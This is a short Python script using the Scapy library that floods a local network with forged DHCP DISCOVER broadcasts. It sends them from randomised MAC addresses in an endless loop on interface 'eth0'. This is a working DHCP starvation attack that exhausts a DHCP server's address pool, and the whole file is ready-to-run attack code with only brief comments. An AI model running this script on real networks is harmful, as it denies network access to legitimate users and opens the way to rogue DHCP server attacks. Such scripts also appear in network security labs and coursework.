#!/usr/bin/python3

from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether

conf.checkIPaddr = False  # Disabling the IP address checking

# Building the DISCOVER packet

# Making an Ethernet packet
DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
            / IP(src='0.0.0.0', dst='255.255.255.255') \
            / UDP(sport=68,dport=67) \
            / BOOTP(op=1, chaddr=RandMAC()) \
            / DHCP(options=[('message-type','discover'), ('end')])


# Sending the crafted packet in layer 2 in a loop using the "eth0" interface
sendp(DHCP_DISCOVER, iface='eth0', loop=1, verbose=1)